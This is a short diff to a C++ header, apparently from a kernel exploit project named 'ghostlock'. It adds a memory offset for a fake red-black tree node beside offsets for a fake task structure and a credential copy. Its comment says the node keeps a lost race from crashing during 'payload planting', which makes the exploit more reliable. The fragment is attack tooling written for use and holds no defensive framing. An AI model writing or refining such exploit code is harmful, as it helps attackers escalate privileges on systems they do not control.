@@ -29,6 +29,10 @@ namespace ghostlock::target {
         inline constexpr std::size_t kRightNodeOffset = 0x1240;
         inline constexpr std::size_t kLeftNodeOffset = 0x1260;
         inline constexpr std::size_t kFakeTaskOffset = 0x1280;
+        /* Holds a self-consistent black rb_node so a lost race that walks the
+         * page-derived write value as a tree node ends the walk instead of
+         * dereferencing a zero grandparent (see util.cpp, payload planting). */
+        inline constexpr std::size_t kRelinkNodeOffset = 0x0200;
         inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
         inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
         inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
